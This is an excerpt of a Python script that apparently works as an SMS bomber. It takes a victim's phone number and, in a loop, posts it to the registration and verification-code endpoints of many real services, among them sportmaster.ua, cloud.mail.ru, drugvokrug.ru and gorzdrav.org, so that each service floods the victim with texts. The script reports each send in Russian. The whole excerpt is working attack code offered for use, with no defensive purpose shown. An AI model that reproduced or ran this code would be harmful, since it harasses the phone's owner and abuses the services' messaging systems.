...
def check_number():
    global phone
    try:
        if int(phone) and len(phone) <= 13: # +380961114455
            if phone[0] == '+':
                phone = phone[1:]
            if phone[0] == '0':
                phone = '38' + phone
...
def start():
    ...
    while iteration < count:
        try:
            ...
            requests.post("https://n13423.yclients.com/api/v1/book_code/312054", data=json.dumps({"phone": phone}), headers=frisor)
            # 1 раз в минуту
        ...
        try:
            requests.post("https://izi.ua/api/auth/register", json={"phone": '+'+phone, "name": _russian, "is_terms_accepted": "true"})
        ...
        try:
            ...
            requests.post(f"https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone={'+'+phone}")
        ...
        try:
            requests.post("https://cloud.mail.ru/api/v2/notify/applink",json={"phone": "+" + phone, "api": 2, "email": _email})
        ...
        try:
            requests.post("https://www.sportmaster.ua/", params={"module": "users", "action": "SendSMSReg", "phone": phone})
        ...
        try:
            requests.post("https://secure.online.ua/ajax/check_phone/", params={"reg_phone": phone})
            print(nice+"SecureOnline отправлено!"+Style.RESET_ALL)
        except:
        ...
        try:
            requests.post("https://mobileplanet.ua/register", data={"klient_name": _name,"klient_phone": "+" + phone,"klient_email": _email})
        ...
        try:
            requests.post('https://apteka366.ru/login/register/sms/send', data={"phone": phone})
        ...
        try:
            ...
            print(fail+"Belkacar не отправлено"+Style.RESET_ALL)
        try:
            requests.post('https://drugvokrug.ru/siteActions/processSms.html', data={"cell": phone})
            print(nice+"Друг Вокруг отправлено!"+Style.RESET_ALL)
        except:
            print(fail+"Друг Вокруг не отправлено"+Style.RESET_ALL)
        try:
            requests.post('https://api.ennergiia.com/auth/api/development/lor', json={"referrer":"ennergiia", "phone": '+'+phone})
            print(nice+"Energiia oтправлено!"+Style.RESET_ALL)
        except:
            print(fail+"Energiia не отправлено"+Style.RESET_ALL)
        try:
            requests.get('https://fundayshop.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.jsp?type=sendConfirmCode&phoneNumber={}'.format('+'+phone))
            print(nice+"Fundayshop oтправлено!"+Style.RESET_ALL)
        except:
            print(fail+"Fundayshop не отправлено"+Style.RESET_ALL)
        try:
            requests.post('https://gorzdrav.org/login/register/sms/send', data={"phone": phone})
        ...
        try:
            requests.post('https://api-production.viasat.ru/api/v1/auth_codes', json={"msisdn": '+'+phone})
